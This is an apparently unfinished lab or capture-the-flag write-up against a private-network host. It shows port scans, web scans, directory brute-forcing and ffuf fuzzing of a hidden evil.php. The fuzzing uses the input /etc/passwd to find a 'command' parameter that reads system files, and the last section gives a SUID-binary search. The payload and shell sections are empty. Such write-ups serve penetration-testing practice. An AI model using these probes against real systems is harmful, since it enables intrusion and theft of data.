#  box writeup


## Machine Configuration
```
IP:192.168.88.52
```

## Credentials for debugging network connectivity
```

```


## Ports open
```
Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-04 13:18 EAT

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsg5B3Ae75r4szTNFqG247Ea8vKjxulITlFGE9YEK4KLJA86TskXQn9E24yX4cYMoF0WDn7JD782HfHCrV74r8nU2kVTw5Y8ZRyBEqDwk6vmOzMvq1Kzrcj+i4f17saErC9YVgx5/33e7UkLXt3MYVjVPIekf/sxWxS4b6N0+J1xiISNcoL/kmG3L7McJzX6Qx6cWtauJf3HOxNtZJ94WetHArSpUyIsn83P+Quxa/uaUgGPx4EkHL7Qx3AVIBbKA7uDet/pZUchcPq/4gv25DKJH4XIty+5/yNQo1EMd6Ra5A9SmnhWjSxdFqTGHpdKnyYHr4VeZ7cpvpQnoiV4y9
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJdleEd7RFnYXv0fbc4pC3l/OWWVAe8GNgoY3hK3C5tlUCvQF+LUFKqe5esCmzIkA8pvpNwEqxC8I2E5XjUtIBo=
|   256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqX8NlpHPg67roxI6Xi8VzNZqC5Uj9KHdAnOcD6/q5/
80/tcp open  http    syn-ack
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:18
Completed NSE at 13:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds

```


## Nikto
```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.88.52
+ Target Hostname:    192.168.88.52
+ Target Port:        80
+ Start Time:         2022-04-02 21:51:18 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x29cd 0x5c9a9bb4d712e 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2022-04-02 21:51:29 (GMT3) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

## Bruteforcing directories
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.88.52
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/02 22:20:59 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 12]   
/secret               (Status: 301) [Size: 315] [--> http://192.168.88.52/secret/]
/server-status        (Status: 403) [Size: 278]                                   
                                                                                  
===============================================================
2022/04/02 22:21:00 Finished
===============================================================

```

## Fuzzing php files
```
ffuf -r -w /usr/share/dirb/wordlists/common.txt -u http://192.168.88.52/secret/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.88.52/secret/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 241ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms]
evil                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 663ms]
                        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 706ms]
:: Progress: [4614/4614] :: Job [1/1] :: 61 req/sec :: Duration: [0:00:04] :: Errors: 0 ::


ffuf -c -r -w ~/wordlists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.88.52/secret/evil.php/?FUZZ=/etc/passwd -fs 0 | tee /tmp/log

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.88.52/secret/evil.php/?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /home/xubzero/wordlists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 5ms]
:: Progress: [2588/2588] :: Job [1/1] :: 498 req/sec :: Duration: [0:00:04] :: Errors: 0 ::





```


## Payload
```

```

### Uploading a better shell
```

```

### Searching for files in the /var/www/html/ directory
```

```

### Searching for files in the home folder
```

```

### Reading user.txt
```

```

### Finding suid binaries
find / -perm -u=s -type f 2>/dev/null
```


```

